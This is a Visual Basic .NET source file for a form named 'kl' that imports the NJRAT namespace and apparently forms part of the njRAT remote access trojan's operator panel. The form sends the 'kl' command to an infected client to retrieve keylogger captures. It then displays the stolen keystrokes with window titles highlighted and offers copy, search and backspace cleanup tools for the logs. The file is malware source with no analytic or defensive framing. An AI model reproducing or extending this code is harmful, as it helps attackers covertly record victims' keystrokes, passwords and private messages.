Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports NJRAT.NJRAT

Public Class kl
    Inherits Form
    ' Methods
    Public c As Client
    Private listViewItem_0 As ListViewItem
    Public Sub New()
        Me.listViewItem_0 = Nothing
        Me.InitializeComponent()
    End Sub
    Public Sub insert(ByVal T As String)
        If (T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1))) Then
            Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
            Me.T1.SelectionColor = Color.SteelBlue
            Me.T1.AppendText((ChrW(13) & ChrW(10) & "[ " & T.Replace(ChrW(1), String.Empty) & "]" & ChrW(13) & ChrW(10)))
        Else
            Me.T1.SelectionFont = Me.T1.Font
            Me.T1.SelectionColor = Me.T1.ForeColor
            Me.T1.AppendText((T & ChrW(13) & ChrW(10)))
        End If
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Me.T1.Copy()
    End Sub

    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Try
            Me.c.Send("kl")
            Me.ToolStripMenuItem1.Enabled = False
        Catch exception1 As Exception
        End Try
    End Sub

    Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SelectAllToolStripMenuItem.Click
        Me.T1.SelectAll()
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        If (Me.T1.Find(Me.TFind.Text, (Me.T1.SelectionStart + Me.T1.SelectionLength), RichTextBoxFinds.None) = -1) Then
            Me.T1.Find(Me.TFind.Text, 0, RichTextBoxFinds.None)
        End If
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Try
            Dim start As Integer = 1
            Dim dataObject As IDataObject = Clipboard.GetDataObject
            Me.T1.ReadOnly = False
            Do While (start <> -1)
                start = Me.T1.Find("[Back]", start, RichTextBoxFinds.None)
                If (start > 0) Then
                    Dim ch As Char = Me.T1.Text.Chars((start - 1))
                    Select Case ch.ToString
                        Case "]", ChrW(10)
                            Me.T1.Select(start, "[back]".Length)
                            Me.T1.Cut()
                            Continue Do
                    End Select
                    Me.T1.Select((start - 1), ("[back]".Length + 1))
                    Me.T1.Cut()
                End If
            Loop
            Clipboard.SetDataObject(dataObject)
            Me.T1.ReadOnly = True
        Catch exception1 As Exception
        End Try
    End Sub
End Class